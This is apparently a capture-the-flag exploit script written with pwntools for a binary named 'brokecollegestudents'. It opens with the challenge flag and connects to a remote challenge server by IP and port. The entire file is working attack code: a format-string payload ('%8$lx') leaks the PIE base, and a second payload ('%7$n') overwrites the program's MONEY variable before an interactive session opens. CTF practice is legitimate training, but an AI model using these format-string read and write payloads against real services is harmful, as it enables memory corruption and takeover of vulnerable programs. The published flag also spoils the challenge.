# kqctf{did_you_resort_to_selling_NFTs_for_college_money_????}
from pwn import *

elf = ELF("./brokecollegestudents")
target = elf.process()
target = remote("143.198.184.186", 5001)

def sla(s, d):
	target.sendline( str(d))

rand = process("./test")
rand.recvuntil(" ")

payload1 = "%8$lx" + "whoamiT"
def p_cycle(payload1):	
	sla(":", 1)
	sla(":", 1)
	while True:
		num = int(rand.recvuntil(" ", drop=True)) % 10
		if num < 2:
			break
		if num > 3:
			sla(":", 1)
			sla(":", payload1)
			break
		else:
			sla(":", 4)

p_cycle(payload1)
target.recvuntil("The scholarship you got was:")
pie_base = int(target.recvuntil("whoamiT", drop=True), 0x10) - 0x1160
log.info("PIE Base: " + hex(pie_base))

payload2 = "%c"*2 + "%7$n" + p64(pie_base + elf.sym['MONEY'] + 3)
p_cycle(payload2)

sla(":", 2)
sla(":", 2)

target.interactive()